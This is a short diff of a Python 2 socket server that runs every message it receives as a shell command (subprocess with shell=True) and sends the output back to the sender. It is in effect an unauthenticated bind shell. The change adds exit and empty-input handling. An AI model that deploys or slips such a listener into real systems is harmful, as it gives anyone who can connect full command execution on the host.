@@ -27,7 +27,11 @@ print 'Connected by: ', addr
 
 while 1:
     data = conn.recv(1024)
-    print data
+    if not data:
+        break
+    if data == "exit":
+        conn.sendall(data)
+        break
     out = subprocess.check_output(data, shell=True)
     conn.sendall(out)
 
